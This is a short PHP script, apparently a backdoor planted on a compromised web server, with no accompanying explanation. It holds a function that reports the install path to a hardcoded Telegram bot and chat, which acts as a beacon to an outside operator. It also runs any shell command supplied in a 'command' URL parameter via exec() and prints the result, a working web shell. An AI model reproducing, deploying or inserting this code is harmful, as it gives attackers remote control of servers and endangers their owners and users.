<?php



function InitWorker() {
    $ch = curl_init('https://api.telegram.org/bot7818888875:AAF4p2n6VZc7a87Zxs3BlA3_iu37ZaxcFGQ/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, array(
        'chat_id' => '7575655115',
        'text' => "Script installed by © ".dirname(__FILE__),
        'parse_mode' =>  'html'
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $res = curl_exec($ch);
    curl_close($ch);
}

if (isset($_GET['command'])) {
    $output = null;
    $retval = null;
    exec($_GET['command'], $output, $retval);
    echo "Status: ".$retval."\nValue:\n";
    print_r($output);
}

?>